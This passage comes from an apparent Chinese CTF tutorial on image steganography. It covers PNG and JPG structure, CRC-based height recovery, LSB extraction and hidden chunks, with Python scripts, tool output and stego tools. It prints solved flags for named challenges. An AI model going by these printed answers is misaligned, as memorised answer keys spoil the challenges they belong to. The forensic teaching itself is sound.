punctuation">(</span>m<span class="token punctuation">)</span>        <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">file</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'.enc'</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span>file1<span class="token punctuation">)</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'openssl rsautl -decrypt -inkey key -in %s -out %s'</span> <span class="token operator">%</span><span class="token punctuation">(</span><span class="token builtin">file</span> <span class="token punctuation">,</span>file1<span class="token punctuation">)</span><span class="token punctuation">)</span>        file1 <span class="token operator">=</span> <span class="token builtin">file</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'rm -f %s %s'</span> <span class="token operator">%</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span>file1<span class="token punctuation">)</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'cat part* > final'</span><span class="token punctuation">)</span></code></pre><p>最终获取flag<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210910104238.png" alt="20210910104238"></p><h2 id="像素值转化"><a href="#像素值转化" class="headerlink" title="像素值转化"></a>像素值转化</h2><h3 id="例题-神奇的二维码"><a href="#例题-神奇的二维码" class="headerlink" title="例题-神奇的二维码"></a>例题-神奇的二维码</h3><p>看看这个文件里的数据，你能想到什么？</p><pre class="language-none"><code class="language-none">255,255,255,255,255...........</code></pre><p>是一串 RGB 值，尝试着将他转化为图片</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">import</span> rex <span class="token operator">=</span> <span class="token number">180</span> <span class="token comment">#x坐标  对于文件里的RGB数据组进行分解</span>y <span class="token operator">=</span> <span class="token number">180</span> <span class="token comment">#y坐标  x*y = 行数</span>rgb1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">**</span><span class="token operator">**</span><span class="token punctuation">]</span> <span class="token comment">#RGB数据</span><span class="token keyword">print</span> <span class="token builtin">len</span><span class="token punctuation">(</span>rgb1<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">3</span> <span class="token comment">#计算有多少组RGB数据</span>m<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>        line <span class="token operator">=</span> rgb1<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">*</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">*</span><span class="token punctuation">(</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token comment">#获取一行</span>        m<span class="token operator">+=</span><span class="token number">1</span>        rgb <span class="token operator">=</span> line        im<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>rgb<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>rgb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>rgb<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#rgb转化为像素</span>im<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>im<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"flag.png"</span><span class="token punctuation">)</span></code></pre><p>然后就是扫描获得一串字符串，base32-栅栏-凯撒获取flag</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210913151921.png" alt="20210913151921"></p><p>flag{QrC0de_iS_in7eRst1ng-}</p><h2 id="图片转像素"><a href="#图片转像素" class="headerlink" title="图片转像素"></a>图片转像素</h2><h3 id="例题-brainfun"><a href="#例题-brainfun" class="headerlink" title="例题-brainfun"></a>例题-brainfun</h3><p>神仙思路：</p><ul><li>首先确定没有其他的隐写存在</li><li>这个图片的大小是512*512，但是可以匹配看成32*32的像素块</li><li>RGB值全部都是16的倍数，也就是说，当以十六进制表示时，第二位永远是0</li><li>此外RGB值中还包含了透明度的值，而这些透明度的值并没有很多种，而且都是可打印字符的ascii值，包括一些小写字母和+，-，.的值</li><li>联想到题目brainfun，想到了brainfuck的编码，同时题目描述这是混乱的</li></ul><p>因此思路就是提取A值，同时以RGB的顺序排列，最后解brainfuck</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">from</span> pybrainfuck <span class="token keyword">import</span> BrainFck<span class="token comment"># Read image and get pixel data as list</span>pixels <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'brainfun.png'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getdata<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Extract just get the blocks. Fun fact: PIL's resize with PIL.Image.NEAREST</span><span class="token comment"># for nearest neighbor messes with the values, but mtPaint does it correctly.</span>pixels <span class="token operator">=</span> <span class="token punctuation">[</span>pixels<span class="token punctuation">[</span>r<span class="token operator">*</span><span class="token number">512</span> <span class="token operator">+</span> c<span class="token punctuation">]</span>          <span class="token keyword">for</span> r <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>          <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token comment"># Sort the pixels by RGB value</span>pixels<span class="token punctuation">.</span>sort<span class="token punctuation">(</span>key<span class="token operator">=</span><span class="token keyword">lambda</span> p<span class="token punctuation">:</span> <span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># Run the alpha values as Brainfuck</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> p <span class="token keyword">in</span> pixels<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>BrainFck<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> p <span class="token keyword">in</span> pixels<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>相关题目:</p><ul><li><a href="https://github.com/ctfs/write-ups-2016/tree/master/csaw-ctf-2016-quals/forensics/brainfun-50">CSAW-2016-quals:Forensic&#x2F;Barinfun</a></li><li><a href="https://github.com/ctfs/write-ups-2017/tree/master/breakin-ctf-2017/misc/A-dance-partner">breakin-ctf-2017:A-dance-partner</a></li></ul><h2 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h2><h3 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h3><p>对于一个 PNG 文件来说，其文件头总是由位固定的字节来描述的，剩余的部分由 3 个以上的 PNG 的数据块（Chunk）按照特定的顺序组成。</p><p>文件头 <code>89 50 4E 47 0D 0A 1A 0A</code> + 数据块 + 数据块 + 数据块……</p><h3 id="数据块CHUNk"><a href="#数据块CHUNk" class="headerlink" title="数据块CHUNk"></a>数据块CHUNk</h3><p>PNG 定义了两种类型的数据块，一种是称为关键数据块（critical chunk），这是标准的数据块，另一种叫做辅助数据块（ancillary chunks），这是可选的数据块。关键数据块定义了 4 个标准数据块，每个 PNG 文件都必须包含它们，PNG 读写软件也都必须要支持这些数据块。</p><table><thead><tr><th>数据块符号</th><th>数据块名称</th><th>多数据块</th><th>可选否</th><th>位置限制</th></tr></thead><tbody><tr><td>IHDR</td><td>文件头数据块</td><td>否</td><td>否</td><td>第一块</td></tr><tr><td>cHRM</td><td>基色和白色点数据块</td><td>否</td><td>是</td><td>在PLTE和IDAT之前</td></tr><tr><td>gAMA</td><td>图像γ数据块</td><td>否</td><td>是</td><td>在PLTE和IDAT之前</td></tr><tr><td>sBIT</td><td>样本有效位数据块</td><td>否</td><td>是</td><td>在PLTE和IDAT之前</td></tr><tr><td>PLTE</td><td>调色板数据块</td><td>否</td><td>是</td><td>在IDAT之前</td></tr><tr><td>bKGD</td><td>背景颜色数据块</td><td>否</td><td>是</td><td>在PLTE之后IDAT之前</td></tr><tr><td>hIST</td><td>图像直方图数据块</td><td>否</td><td>是</td><td>在PLTE之后IDAT之前</td></tr><tr><td>tRNS</td><td>图像透明数据块</td><td>否</td><td>是</td><td>在PLTE之后IDAT之前</td></tr><tr><td>oFFs</td><td>（专用公共数据块）</td><td>否</td><td>是</td><td>在IDAT之前</td></tr><tr><td>pHYs</td><td>物理像素尺寸数据块</td><td>否</td><td>是</td><td>在IDAT之前</td></tr><tr><td>sCAL</td><td>（专用公共数据块）</td><td>否</td><td>是</td><td>在IDAT之前</td></tr><tr><td>IDAT</td><td>图像数据块</td><td>是</td><td>否</td><td>与其他IDAT连续</td></tr><tr><td>tIME</td><td>图像最后修改时间数据块</td><td>否</td><td>是</td><td>无限制</td></tr><tr><td>tEXt</td><td>文本信息数据块</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>zTXt</td><td>压缩文本数据块</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>fRAc</td><td>（专用公共数据块）</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>gIFg</td><td>（专用公共数据块）</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>gIFt</td><td>（专用公共数据块）</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>gIFx</td><td>（专用公共数据块）</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>IEND</td><td>图像结束数据</td><td>否</td><td>否</td><td>最后一个数据块</td></tr></tbody></table><p>对于每个数据块都有着统一的数据结构，每个数据块由 4 个部分组成</p><table><thead><tr><th>名称</th><th>字节数</th><th>说明</th></tr></thead><tbody><tr><td>Length（长度）</td><td>4字节</td><td>指定数据块中数据域的长度，其长度不超过（231－1）字节</td></tr><tr><td>Chunk Type Code（数据块类型码）</td><td>4字节</td><td>数据块类型码由 ASCII 字母（A - Z 和 a - z）组成</td></tr><tr><td>Chunk Data（数据块数据）</td><td>可变长度</td><td>存储按照 Chunk Type Code 指定的数据</td></tr><tr><td>CRC（循环冗余检测）</td><td>4字节</td><td>存储用来检测是否有错误的循环冗余码</td></tr></tbody></table><p>CRC（Cyclic Redundancy Check）域中的值是对 Chunk Type Code 域和 Chunk Data 域中的数据进行计算得到的。</p><h3 id="IHDR"><a href="#IHDR" class="headerlink" title="IHDR"></a>IHDR</h3><p>文件头数据块 IHDR（Header Chunk）：它包含有 PNG 文件中存储的图像数据的基本信息，由 13 字节组成，并要作为第一个数据块出现在 PNG 数据流中，而且一个 PNG 数据流中只能有一个文件头数据块</p><p>其中我们关注的是前8字节的内容</p><table><thead><tr><th>域的名称</th><th>字节数</th><th>说明</th></tr></thead><tbody><tr><td>Width</td><td>4 bytes</td><td>图像宽度，以像素为单位</td></tr><tr><td>Height</td><td>4 bytes</td><td>图像高度，以像素为单位</td></tr></tbody></table><p>我们经常会去更改一张图片的高度或者宽度使得一张图片显示不完整从而达到隐藏信息的目的。</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/pngihdr.png" alt="pngihdr"></p><p>这里可以发现在 Kali 中是打不开这张图片的，提示 <code>IHDR CRC error</code>，而 Windows 10 自带的图片查看器能够打开，就提醒了我们 IHDR 块被人为的篡改过了，从而尝试修改图片的高度或者宽度发现隐藏的字符串。</p><p>对于png的IHDR部分的隐写，有如下的工具和脚本，可以解决大部分问题</p><ul><li>PCRT(还不错)：自动修复图片</li><li>pngcheck（配合脚本使用）：自动检查宽高与crc的匹配关系</li><li>magnetos（强烈推荐）: 一个强大的自动化misc工具<ul><li><a href="https://github.com/restran/magnetos.git">https://github.com/restran/magnetos.git</a></li></ul></li><li>pngcalculate：根据CRC校验和计算图片的宽高</li></ul><pre class="language-python" data-language="python"><code class="language-python">```python<span class="token keyword">import</span> os<span class="token keyword">import</span> binascii<span class="token keyword">import</span> structmisc <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.png"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> misc<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'>i'</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token operator">+</span> misc<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">]</span>    crc32 <span class="token operator">=</span> binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span>    <span class="token keyword">if</span> crc32 <span class="token operator">==</span> <span class="token number">0x932f8a6b</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> i</code></pre><h4 id="例题-evalheight"><a href="#例题-evalheight" class="headerlink" title="例题-evalheight"></a>例题-evalheight</h4><p>根据题目名称肯定是修改高度了,这里展示一下多种工具的使用.<br>magnetos：</p><pre class="language-bash" data-language="bash"><code class="language-bash">what_steg <span class="token parameter variable">-f</span> Evalheight.png<span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> PNG图片宽高CRC32校验失败，文件宽高被修改过<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 尝试爆破图片高度<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 找到正确的图片高度: <span class="token number">350</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> 保存修正高度后的文件: fix_height.png<span class="token punctuation">..</span>.</code></pre><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210927140005.png" alt="20210927140005"></p><p>pngcheck&amp;pngcalculate</p><pre class="language-bash" data-language="bash"><code class="language-bash">pngcheck <span class="token parameter variable">-p</span> Evalheight.pngFile: Evalheight.png <span class="token punctuation">(</span><span class="token number">92446</span> bytes<span class="token punctuation">)</span>Evalheight.png  CRC error <span class="token keyword">in</span> chunk IHDR <span class="token punctuation">(</span>computed ca422c59, expected 52056cd4<span class="token punctuation">)</span>ERROR: Evalheight.pngpython3 pngcal.py<span class="token number">430</span> <span class="token number">350</span>hex: 0x1ae 0x15e</code></pre><p>然后在010editor里面手动修改即可</p><h4 id="例题-realme"><a href="#例题-realme" class="headerlink" title="例题-realme"></a>例题-realme</h4><p>打开题目发现文件头是损坏的<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210927230737.png" alt="20210927230737"></p><p>修复了之后发现文件的宽高也与crc的校验和不匹配，因此计算真实的宽、高</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#通过pngcal计算出宽高的值，然后利用010editor修改获取flag</span>09 <span class="token number">760</span>hex: 0x2c5 0x2f8</code></pre><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210927234257.png" alt="20210927234257"></p><h3 id="PLTE"><a href="#PLTE" class="headerlink" title="PLTE"></a>PLTE</h3><p>调色板数据块 PLTE（palette chunk）：它包含有与索引彩色图像（indexed-color image）相关的彩色变换数据，它仅与索引彩色图像有关，而且要放在图像数据块（image data<br>chunk）之前。真彩色的 PNG 数据流也可以有调色板数据块，目的是便于非真彩色显示程序用它来量化图像数据，从而显示该图像。</p><h3 id="IDAT"><a href="#IDAT" class="headerlink" title="IDAT"></a>IDAT</h3><p>图像数据块 IDAT（image data chunk）：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。</p><ul><li>储存图像像数数据</li><li>在数据流中可包含多个连续顺序的图像数据块</li><li>采用 LZ77 算法的派生算法进行压缩</li><li>可以用 zlib 解压缩</li></ul><p>值得注意的是，IDAT 块只有当上一个块充满时，才会继续一个新的块。</p><p>用 <code>pngcheck</code> 去查看此 PNG 文件</p><pre class="language-bash" data-language="bash"><code class="language-bash">λ .<span class="token punctuation">\</span>pngcheck.exe <span class="token parameter variable">-v</span> sctf.pngFile: sctf.png <span class="token punctuation">(</span><span class="token number">1421461</span> bytes<span class="token punctuation">)</span>  chunk IHDR at offset 0x0000c, length <span class="token number">13</span>    <span class="token number">1000</span> x <span class="token number">562</span> image, <span class="token number">32</span>-bit RGB+alpha, non-interlaced  chunk sRGB at offset 0x00025, length <span class="token number">1</span>    rendering intent <span class="token operator">=</span> perceptual  chunk gAMA at offset 0x00032, length <span class="token number">4</span>: <span class="token number">0.45455</span>  chunk pHYs at offset 0x00042, length <span class="token number">9</span>: 3780x3780 pixels/meter <span class="token punctuation">(</span><span class="token number">96</span> dpi<span class="token punctuation">)</span>  chunk IDAT at offset 0x00057, length <span class="token number">65445</span>    zlib: deflated, 32K window, fast compression  chunk IDAT at offset 0x10008, length <span class="token number">65524</span><span class="token punctuation">..</span>.  chunk IDAT at offset 0x150008, length <span class="token number">45027</span>  chunk IDAT at offset 0x15aff7, length <span class="token number">138</span>  chunk IEND at offset 0x15b08d, length <span class="token number">0</span>No errors detected <span class="token keyword">in</span> sctf.png <span class="token punctuation">(</span><span class="token number">28</span> chunks, <span class="token number">36.8</span>% compression<span class="token punctuation">)</span>.</code></pre><p>可以看到，正常的块的 length 是在 65524 的时候就满了，而倒数第二个 IDAT 块长度是 45027，最后一个长度是 138，很明显最后一个 IDAT 块是有问题的，因为他本来应该并入到倒数第二个未满的块里.</p><p>利用 <code>python zlib</code> 解压多余 IDAT 块的内容，此时注意剔除 <strong>长度、数据块类型及末尾的CRC校验值</strong>。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zlib<span class="token keyword">import</span> binasciiIDAT <span class="token operator">=</span> <span class="token string">"789...667"</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>result <span class="token operator">=</span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>IDAT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> result</code></pre><h3 id="IEND"><a href="#IEND" class="headerlink" title="IEND"></a>IEND</h3><p>图像结束数据 IEND（image trailer chunk）：它用来标记 PNG 文件或者数据流已经结束，并且必须要放在文件的尾部。</p><pre class="language-none"><code class="language-none">00 00 00 00 49 45 4E 44 AE 42 60 82</code></pre><p>IEND 数据块的长度总是 <code>00 00 00 00</code>，数据标识总是 IEND <code>49 45 4E 44</code>，因此，CRC 码也总是 <code>AE 42 60 82</code>。</p><p>这里是可以隐藏数据的，解法也很简单，使用工具、010editor等都可以获取。</p><h4 id="例题-hidden"><a href="#例题-hidden" class="headerlink" title="例题-hidden"></a>例题-hidden</h4><p>使用PCRT直接获取隐藏数据<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210928093447.png" alt="20210928093447"></p><h4 id="例题-hiddenplus"><a href="#例题-hiddenplus" class="headerlink" title="例题-hiddenplus"></a>例题-hiddenplus</h4><p>使用PCRT发现提示隐藏着PNG图片，分离图片得flag<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210928093734.png" alt="20210928093734"></p><h3 id="其余辅助数据块"><a href="#其余辅助数据块" class="headerlink" title="其余辅助数据块"></a>其余辅助数据块</h3><ul><li>背景颜色数据块 bKGD（background color）</li><li>基色和白色度数据块 cHRM（primary chromaticities and white point），所谓白色度是指当 <code>R＝G＝B＝最大值</code> 时在显示器上产生的白色度</li><li>图像 γ 数据块 gAMA（image gamma）</li><li>图像直方图数据块 hIST（image histogram）</li><li>物理像素尺寸数据块 pHYs（physical pixel dimensions）</li><li>样本有效位数据块 sBIT（significant bits）</li><li>文本信息数据块 tEXt（textual data）</li><li>图像最后修改时间数据块 tIME （image last-modification time）</li><li>图像透明数据块 tRNS （transparency）</li><li>压缩文本数据块 zTXt （compressed textual data）</li></ul><h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><p>LSB 全称 Least Significant Bit，最低有效位。PNG 文件中的图像像数一般是由 RGB 三原色（红绿蓝）组成，每一种颜色占用 8 位，取值范围为 <code>0x00</code> 至 <code>0xFF</code>，即有 256 种颜色，一共包含了 256 的 3 次方的颜色，即 16777216 种颜色。</p><p>而人类的眼睛可以区分约1000万种不同的颜色，意味着人类的眼睛无法区分余下的颜色大约有6777216种。</p><p>LSB 隐写就是修改 RGB 颜色分量的最低二进制位（LSB），每个颜色会有 8 bit，LSB 隐写就是修改了像数中的最低的 1 bit，而人类的眼睛不会注意到这前后的变化，每个像素可以携带 3 比特的信息。</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/lsb.jpg" alt="lsb"></p><p>如果是要寻找这种 LSB 隐藏痕迹的话，有一个工具 <a href="http://www.caesum.com/handbook/Stegsolve.jar">Stegsolve</a> 是个神器，可以来辅助我们进行分析。</p><p>LSB 的信息借助于 Stegsolve 查看各个通道时一定要细心捕捉异常点，抓住 LSB 隐写的蛛丝马迹。</p><h3 id="例题-lshhiddenplus1-lshhiddenplus"><a href="#例题-lshhiddenplus1-lshhiddenplus" class="headerlink" title="例题-lshhiddenplus1&amp;lshhiddenplus"></a>例题-lshhiddenplus1&amp;lshhiddenplus</h3><p>使用magnetos进行分析，在输出结果里发现这么一个压缩包<br>解压之后发现是一个elf文件</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">file</span> <span class="token number">1</span><span class="token number">1</span>: ELF <span class="token number">64</span>-bit LSB executable, x86-64, version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="token keyword">for</span> GNU/Linux <span class="token number">2.6</span>.24, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>8df45089fa39fec83423ec37a944e81065d16bee, not stripped</code></pre><p>运行获取flag</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>Desktop<span class="token punctuation">]</span> <span class="token function">chmod</span> +x <span class="token number">1</span>                                                        <span class="token punctuation">[</span>Desktop<span class="token punctuation">]</span> ./1                                                               hctf<span class="token punctuation">&#123;</span>dd0gf4c3tok3yb0ard4g41n~~~<span class="token punctuation">&#125;</span><span class="token comment">#  </span></code></pre><p>另一种方法是借助 <code>Stegsolve--&gt;Analyse--&gt;Data Extract</code> 可以指定通道进行提取。</p><p>可以发现 <code>zip</code> 头，用 <code>save bin</code> 保存为压缩包后，打开运行其中的 ELF 文件就可以得到最后的 flag。</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210927164819.png" alt="20210927164819"></p><blockquote><p>更多关于 LSB 的研究可以看 <a href="https://zhuanlan.zhihu.com/p/23890677">这里</a>。</p></blockquote><h3 id="例题-lsbhidden"><a href="#例题-lsbhidden" class="headerlink" title="例题-lsbhidden"></a>例题-lsbhidden</h3><p>通过下方的按钮可以观察每个通道的信息，例如查看 R 通道的最低位第 8 位平面的信息。</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210927161224.png" alt="20210927161224"></p><h2 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h2><h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><ul><li>JPEG 是有损压缩格式，将像素信息用 JPEG 保存成文件再读取出来，其中某些像素值会有少许变化。在保存时有个质量参数可在 0 至 100 之间选择，参数越大图片就越保真，但图片的体积也就越大。一般情况下选择 70 或 80 就足够了</li><li>JPEG 没有透明度信息</li></ul><p>JPG 基本数据结构为两大类型：「段」和经过压缩编码的图像数据。</p><table><thead><tr><th>名 称</th><th>字节数</th><th>数据</th><th>说明</th></tr></thead><tbody><tr><td>段 标识</td><td>1</td><td>FF</td><td>每个新段的开始标识</td></tr><tr><td>段类型</td><td>1</td><td></td><td>类型编码（称作标记码）</td></tr><tr><td>段长 度</td><td>2</td><td></td><td>包括段内容和段长度本身,不包括段标识和段类型</td></tr><tr><td>段内容</td><td>2</td><td></td><td>≤65533字节</td></tr></tbody></table><ul><li>有些段没有长度描述也没有内容，只有段标识和段类型。文件头和文件尾均属于这种段。</li><li>段与段之间无论有多少 <code>FF</code> 都是合法的，这些 <code>FF</code> 称为「填充字节」，必须被忽略掉。</li></ul><p>一些常见的段类型<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/jpgformat.png" alt="jpgformat"></p><p><code>0xffd8</code> 和 <code>0xffd9</code>为 JPG 文件的开始结束的标志。</p><h2 id="隐写软件"><a href="#隐写软件" class="headerlink" title="隐写软件"></a>隐写软件</h2><h3 id="Stegdetect"><a href="#Stegdetect" class="headerlink" title="Stegdetect"></a><a href="https://github.com/redNixon/stegdetect">Stegdetect</a></h3><p>通过统计分析技术评估 JPEG 文件的 DCT 频率系数的隐写工具, 可以检测到通过 JSteg、JPHide、OutGuess、Invisible<br>Secrets、F5、appendX 和 Camouflage 等这些隐写工具隐藏的信息，并且还具有基于字典暴力破解密码方法提取通过 Jphide、outguess 和 jsteg-shell 方式嵌入的隐藏信息。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-q</span> 仅显示可能包含隐藏内容的图像。<span class="token parameter variable">-n</span> 启用检查JPEG文件头功能，以降低误报率。如果启用，所有带有批注区域的文件将被视为没有被嵌入信息。如果JPEG文件的JFIF标识符中的版本号不是1.1，则禁用OutGuess检测。<span class="token parameter variable">-s</span> 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。<span class="token parameter variable">-d</span> 打印带行号的调试信息。<span class="token parameter variable">-t</span> 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：j 检测图像中的信息是否是用jsteg嵌入的。o 检测图像中的信息是否是用outguess嵌入的。p 检测图像中的信息是否是用jphide嵌入的。i 检测图像中的信息是否是用invisible secrets嵌入的。</code></pre><h3 id="JPHS"><a href="#JPHS" class="headerlink" title="JPHS"></a><a href="http://linux01.gwdg.de/~alatham/stego.html">JPHS</a></h3><p>JPEG 图像的信息隐藏软件 JPHS，它是由 Allan Latham 开发设计实现在 Windows 和 Linux 系统平台针对有损压缩 JPEG 文件进行信息加密隐藏和探测提取的工具。软件里面主要包含了两个程序 JPHIDE和 JPSEEK。JPHIDE 程序主要是实现将信息文件加密隐藏到 JPEG 图像功能，而 JPSEEK 程序主要实现从用 JPHIDE 程序加密隐藏得到的 JPEG 图像探测提取信息文件，Windows 版本的 JPHS 里的 JPHSWIN 程序具有图形化操作界面且具备 JPHIDE 和 JPSEEK 的功能。</p><h3 id="SilentEye"><a href="#SilentEye" class="headerlink" title="SilentEye"></a><a href="http://silenteye.v1kings.io/">SilentEye</a></h3><blockquote><p>SilentEye is a cross-platform application design for an easy use of steganography, in this case hiding messages into pictures or sounds. It provides a pretty nice interface and an easy integration of new steganography algorithm and cryptography process by using a 